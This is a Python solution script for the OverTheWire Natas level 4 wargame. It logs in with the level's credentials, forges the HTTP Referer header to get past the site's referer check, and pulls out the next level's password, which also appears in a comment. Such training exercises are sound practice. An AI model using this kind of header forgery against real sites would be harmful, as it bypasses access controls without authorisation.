import requests
import bs4
import re


# configuration for natas4
USERNAME = 'natas4'
PASSWORD = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
URL = 'http://natas4.natas.labs.overthewire.org'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
response = session.get(url=URL)
soup = bs4.BeautifulSoup(response.text, 'html.parser')
div_content = soup.find('body').find('div', {'id' : 'content'})
print(f'{div_content}\n')


# we need to change the referer in the header request
# as the site only accepts authorised users from
# http://natas5.natas.labs.overthewire.org/
session.headers.update({'referer' : 'http://natas5.natas.labs.overthewire.org/'})
response = session.get(url=URL)
soup = bs4.BeautifulSoup(response.text, 'html.parser')
div_content = soup.find('body').find('div', {'id' : 'content'})
print(f'{div_content}\n')


# natas5 password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
password = re.search(r'is (\w+)\n', str(div_content)).group(1)
print(f'natas5 password: {password}')